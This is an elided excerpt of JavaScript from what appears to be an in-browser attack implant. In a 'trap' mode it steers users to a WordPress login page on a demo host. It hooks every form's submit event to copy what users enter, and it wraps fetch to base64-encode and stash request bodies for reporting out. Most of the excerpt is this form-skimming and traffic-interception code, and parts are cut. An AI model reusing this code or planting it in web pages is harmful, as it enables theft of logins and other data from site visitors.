...
function initGlobals()
{
	...
	if (window.taperMode === "trap")
	{
		...
		// they'll start here
		window.taperstartingPage = "https://targetapp.localdemo/wp-login.php";
	...
	// Should we intercept and copy Form submissions?
...
// Hook all the form submissions on the page
// So we get a copy for ourselves. 
// Called a lot to make sure we don't miss some input
// Code checks (attributes) makes sure we don't register 
// events multiple times
function hookForms()
{
	if (window.taperexfilFormSubmissions)
	{
		var myReference = "";
	...
	// Select all forms on the page
		forms = myReference.querySelectorAll('form');
	...
	// Attach the event listener to all forms
		...
		{
		// check to see if we've already hooked this form
			if (forms[index].getAttribute("tappedState") != "true")
			{
				forms[index].setAttribute("tappedState", "true");
				forms[index].addEventListener('submit', interceptFormSubmit);
			}
		}
	}
}
  ...
  function customFetch(url, options)
  {
	...
	// Stash the details to report out
  	fetchDetailsMap.set(requestId, {
  		...
  		body:           options.body ? btoa(options.body) : null,
  		responseStatus: null,
  		responseBody:   null
  	});
